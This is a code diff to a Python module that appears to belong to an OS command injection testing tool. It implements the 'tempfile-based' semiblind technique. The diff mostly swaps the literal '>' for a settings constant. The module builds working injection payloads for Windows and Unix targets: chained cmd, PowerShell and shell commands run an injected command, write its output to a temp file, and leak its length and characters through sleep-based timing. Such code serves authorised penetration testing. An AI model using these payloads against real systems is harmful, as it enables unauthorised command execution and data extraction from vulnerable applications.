@@ -13,8 +13,9 @@ the Free Software Foundation, either version 3 of the License, or
 For more see the file 'readme/COPYING' for copying permission.
 """
 
-from src.thirdparty.six.moves import urllib as _urllib
 from src.utils import settings
+from src.core.injections.controller import checks
+from src.thirdparty.six.moves import urllib as _urllib
 
 """
 The "tempfile-based" technique on Semiblind OS Command Injection.
@@ -29,7 +30,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
+                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
@@ -41,7 +42,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
+                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + ampersand + ""
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
@@ -52,7 +53,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
@@ -66,7 +67,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
@@ -82,7 +83,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" + separator +
-                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${%23str} " + separator +
@@ -95,7 +96,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + pipe + 
+                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + 
                 pipe + "tr -d '\\n'" + 
                 pipe + "wc -c) ] " + separator +
@@ -115,7 +116,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
+                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
@@ -126,7 +127,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
-                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
+                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + ampersand + ""
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
@@ -204,7 +205,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + "< nul" + pipe + " "
+                settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "< nul" + pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
@@ -223,7 +224,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + "< nul" + ampersand + ""
+                settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "< nul" + ampersand + ""
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
@@ -239,7 +240,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -257,7 +258,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     elif separator == "%0a" :
       #separator = "\n"
       payload = (separator +
-                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -277,8 +278,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + ")" + separator +
-                "echo $str >" + OUTPUT_TEXTFILE + separator +
+                "str=$(" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + ")" + separator +
+                "echo $str" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
@@ -287,15 +288,17 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 "str1=$(od -A n -t d1<" + OUTPUT_TEXTFILE + ")" + separator +
-                "echo $str1 >" + OUTPUT_TEXTFILE 
+                "echo $str1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE 
                 )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
       
     elif separator == "||" :                
       pipe = "|"
+      cmd = cmd.rstrip()
+      cmd = checks.add_command_substitution(cmd)
       payload = (pipe +
-                "echo $(" + cmd.rstrip() + ")>" + OUTPUT_TEXTFILE + pipe + 
+                cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + 
                 "tr -d '\\n'" + pipe + "wc -c) ]" + separator +
                 "sleep " + str(timesec)
@@ -317,7 +320,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + "< nul " + pipe + " "
+                settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "< nul " + pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
@@ -331,7 +334,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + "< nul " + ampersand + ""
+                settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "< nul " + ampersand + ""
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
